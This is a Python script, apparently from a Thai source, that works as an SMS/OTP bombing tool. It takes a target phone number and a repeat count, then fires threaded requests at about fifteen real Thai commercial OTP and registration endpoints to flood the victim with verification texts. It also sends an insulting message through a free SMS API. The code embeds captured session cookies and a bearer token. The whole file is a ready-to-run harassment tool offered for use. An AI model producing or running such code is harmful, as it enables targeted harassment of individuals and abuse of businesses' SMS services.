import requests
import asyncio
import time
import threading
import os
from re import search
from requests import Session
os.system("clear")

user = "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"

print("เขียนโดย   :! ROLEX#9802")
print("รายละเอียด : asyncio functions")
print("----------------------------")
phone = input("เบอร์โทรศัพท์ : ")
jam = int(input("จำนวน : "))
print("----------------------------")
print("")


async def main():
	def api1():
		s = Session()
		ReqTOKEN = s.get("https://youpik.com/",headers={"user-agent": user}).text
		s.post("https://api.ulive.youpik.com/api-base/sms/sendCode",headers={"content-type": "application/x-www-form-urlencoded;charset=UTF-8","user-agent": user,"authorization": f'''Basic {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN)}''',"accept": "application/json, text/plain, */*"},data=f"phone={phone[1:]}&type=1")
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api2():
		s = Session()
		s.post("https://www.selectiontoyou.com/backend/sms/tmp_otp.php",headers={"user-agent": user,"content-type": "application/x-www-form-urlencoded; charset=UTF-8"},data=f"mobile={phone}")
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api3():
		s = Session()
		s.get(f"https://app.xcommerce.co.th/site/request-otp?telephone={phone}",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","referer": "https://app.xcommerce.co.th/user/register","cookie": "_ga=GA1.3.285166653.1653546969;_gid=GA1.3.1609593228.1653546969;_fbp=fb.2.1653547066069.1821032110;_ati=8631170146840;PHPSESSID=gpbiuanjck8c0l2oephjerd2jb;_csrf=93488a9900fa880721cc9759968832e740e1024404bbec7caccac12c91065fc5a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22NcTBI6atGeH9jMpsZSRZ-51ZFP8WVm64%22%3B%7D;_gat=1"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api4():
		s = Session()
		s.post("https://api.freshket.co/baseApi/Users/RequestOtp",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},json = {"isDev":"false","language":"th","phone":f"+66{phone[1:]}"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api5():
		s = Session()
		s.get(f"https://v2.api01.wemove.co.th/auth/api/v1/user/otp?phone={phone}",headers={"User-Agent": user,"Content-Type": "application/json","Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZU1vdmUiLCJzdWIiOiJVMjIwNjExMTU0NDQ2OTMxNTI1NTlkMmQ3NTJlODc4MDM0YTgzYThmNzFkZjk3NzU0NmEiLCJyZWYiOiIyMjA2MTExNTQ0NDg0NDIyOTYiLCJleHAiOjE2ODY0OTgyODguNDQyMzM1LCJuYmYiOjE2NTQ5NjIyODguNDQyMzM3MywiaWF0IjoxNjU0OTYyMjg4LjQ0MjMzODJ9.57KWEK9TFMpFd1adVmRZClzK8pcv3UVtjUF9EUHKsNA"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def textsms():
		s = Session()
		s.post("https://textbelt.com/text",data={"phone": f"+66{phone[1:]}","message": "โดนยิงเบอร์ไงไอควาย !!!","key":"textbelt"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api6():
		s = Session()
		s.post("https://jdbaa.com/api/otp-not-captcha",headers={"content-type": "application/json; charset=UTF-8","user-agent": user,"cookie":"_ga=GA1.2.139524076.1653888756;_hjSessionUser_1879787=eyJpZCI6IjczNjVhMTYxLTFkNzktNWVjYS04N2M4LTc3ZTk3ODUyY2U3ZiIsImNyZWF0ZWQiOjE2NTM4ODg3NTc4ODksImV4aXN0aW5nIjp0cnVlfQ==;connect.sid=s%3Ald5XYlT7Woupxt9bPB0E1I1HtUrLV-tn.51i6oAhTM89FJtgttSqhIkAQtf1m7RE8FeRgs68b270;_gid=GA1.2.909352945.1654997247;_hjSession_1879787=eyJpZCI6ImIzMzViZDAyLTRmYWItNGNlNC04Yzc1LTc4M2Y4MTdhOGFmMSIsImNyZWF0ZWQiOjE2NTQ5OTcyNTAyNjUsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;_fw_crm_v=b55243cc-06b2-4f25-ca32-2a7634301a95;io=8MwOfwvymeYHqZT4AmGQ;_gat_gtag_UA_139533742_1=1;countdown_lotto_th=367885;_hjIncludedInSessionSample=0;modal_htd=true"},json={"phone_number":"0958816629","user_id":"ak0958816629"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api7():
		requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no",headers={"content-type": "application/json;charset=UTF-8","user-agent": user},json={"username": phone})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api8():
		requests.post("https://www.carsome.co.th/website/login/sendSMS",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_aw=GCL.1652292293.CjwKCAjwve2TBhByEiwAaktM1LlQbbsCa7Ble54KxJXr_qUBm2gMaszoH50VX1hJGLgS14k8SLr5XBoC1HsQAvD_BwE;_gcl_dc=GCL.1652292293.CjwKCAjwve2TBhByEiwAaktM1LlQbbsCa7Ble54KxJXr_qUBm2gMaszoH50VX1hJGLgS14k8SLr5XBoC1HsQAvD_BwE;_gcl_au=1.1.717351003.1652292293;_ga=GA1.3.1257047534.1652292299;_gid=GA1.3.1037439662.1652292300;_gat_UA-222184937-1=1;_gac_UA-70043720-5=1.1652292300.CjwKCAjwve2TBhByEiwAaktM1LlQbbsCa7Ble54KxJXr_qUBm2gMaszoH50VX1hJGLgS14k8SLr5XBoC1HsQAvD_BwE;_gat_UA-70043720-5=1;amp_893e6b=Ti8A7k_r5WemCbKCqRGk6b...1g2q4n1bu.1g2q4nbcs.1.0.1;__lt__cid=d934a289-410e-4c52-ad26-c61c9141cf7a;__lt__sid=d2be9de9-0c4d0a6e;_uetsid=e09d03e0d15411ec89b41f1beb84cd85;_uetvid=e0a09880d15411ecaedf2b186a3c3a8e;_fbp=fb.2.1652292303459.159355486;__qca=P0-2066761044-1652292303084;ajs_anonymous_id=d8989c8f-d8db-420d-bc5a-eecabb7b2ba8;_clck=9y320x|1|f1d|0;_clsk=19yhgnz|1652292308294|1|1|d.clarity.ms/collect;_hjSessionUser_1895262=eyJpZCI6Ijk1ODg4ZTdmLTdmMzktNWQ2MC04ZmE0LWNmODhiODM5MjkyMiIsImNyZWF0ZWQiOjE2NTIyOTIzMDgxOTgsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_1895262=eyJpZCI6ImY1MDE5NTJmLWVlZmUtNDQ5Mi04NzExLTFkMTJlNjlmNDk5ZSIsImNyZWF0ZWQiOjE2NTIyOTIzMDkwOTUsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=1;moe_uuid=245c6b77-408c-423f-97f5-4b9b3779bc8e;_gac_UA-222184937-1=1.1652292324.CjwKCAjwve2TBhByEiwAaktM1LlQbbsCa7Ble54KxJXr_qUBm2gMaszoH50VX1hJGLgS14k8SLr5XBoC1HsQAvD_BwE;_ga_SYEVK0JJXV=GS1.1.1652292298.1.1.1652292323.0"},json={"username":phone,"optType":0})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api9():
		requests.post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_ga=GA1.2.569307254.1652026876;_fbp=fb.1.1652026940217.1957414973;OptanonAlertBoxClosed=2022-05-08T16:22:27.170Z;__cfruid=29f4d9ee09edea9faee279b0ea3f90df4aace499-1652294530;_gid=GA1.2.755864713.1652294531;next-i18next=th;TS01dbb077=0166bb864da781eed0fe4636f0b7d608b1fe3f43df989fcccfdfeafa0e727164160f9e64ed16c3c4a69148498ae3f6366dd89991829443726617b3203f39317f7daacb4a0aded43037d6e8dfb5c05054e13521d3ec;_gat_UA-159935452-1=1;OptanonConsent=isGpcEnabled=0&datestamp=Thu+May+12+2022+01%3A42%3A53+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.25.0&isIABGlobal=false&hosts=&consentId=04cc1462-177d-4bf8-92d3-f87b2e8563ce&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1&geolocation=TH%3B10&AwaitingReconsent=false;d-chat-ct=2"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api10():
		requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"content-type": "application/json;charset=UTF-8","user-agent": user},json={"phonenumber":phone,"language":"th"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api11():
		requests.get(f"https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}",headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "_gcl_au=1.1.1572308064.1653547614;_fbp=fb.1.1653547614308.1872923719;_gid=GA1.2.1794415642.1653547617;_tt_enable_cookie=1;_ttp=7eba6ff7-ff02-4342-b5dd-b9866f6efdee;f34c_cookieOrder_ID=38158040;PHPSESSID=uhm5651ofptiq9j3qn9rq4r8cl;f34c_new_user_view_count=%7B%22count%22%3A4%2C%22expire_time%22%3A1653634003%7D;_ga_Z9S47GV47R=GS1.1.1653557562.2.0.1653557563.0;_ga=GA1.2.1679688388.1653547616;_gat_UA-28072727-2=1"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api12():
		requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,"language":"th"},headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api13():
		requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers={"content-type": "application/json;charset=UTF-8","user-agent": user,"cookie": "visid_incap_2104120=nKLB3I4kTxyG0rwpREJfq2X8e2IAAAAAQUIPAAAAAAAmtL05OrKaTllBBqJjs7e8;tids=n5reedjdndul6tgdvoplrcflslgibft1;_ga_id=501189513.1652292717;visid_incap_2679318=1mZOjca8RsW3siwUhQjwS/v9e2IAAAAAQUIPAAAAAAB8i+u6b3SAARMQrpBKM0J2;_gcl_au=1.1.1579928234.1652293117;_gid=GA1.2.1921666839.1652293118;_fbp=fb.1.1652293119246.1427771419;_ga_R05PJC3ZG8=GS1.1.1652327112.2.0.1652327113.59;_ga=GA1.2.1030689609.1652293118;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=C391B84F.2;_ctout26068=1;verify=test;OptanonAlertBoxClosed=2022-05-12T03:45:21.464Z;OptanonConsent=isIABGlobal=false&datestamp=Thu+May+12+2022+10%3A45%3A21+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1"},json={"msisdn":phone,"function":"enroll"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	def api14():
		requests.get(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha_new?mobile=66-{phone}",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","Cookie": "_gcl_au=1.1.791423488.1653888360; _ga=GA1.2.1907064666.1653888361; _gid=GA1.2.635648461.1653888361; _tt_enable_cookie=1; _ttp=147a6243-aac5-4feb-8cd3-7bbb4f5ea495; _fbp=fb.1.1653888362838.126932688"})
		print(f"ยิงไปที่เบอร์ {phone} | asyncio")
	threading.Thread(target=api1).start()
	threading.Thread(target=api2).start()
	threading.Thread(target=api3).start()
	threading.Thread(target=api4).start()
	threading.Thread(target=api5).start()
	threading.Thread(target=textsms).start()
	threading.Thread(target=api6).start()
	threading.Thread(target=api7).start()
	threading.Thread(target=api8).start()
	threading.Thread(target=api9).start()
	threading.Thread(target=api10).start()
	threading.Thread(target=api11).start()
	threading.Thread(target=api12).start()
	threading.Thread(target=api13).start()
	threading.Thread(target=api14).start()
	
	
for i in range(jam):
	asyncio.run(main())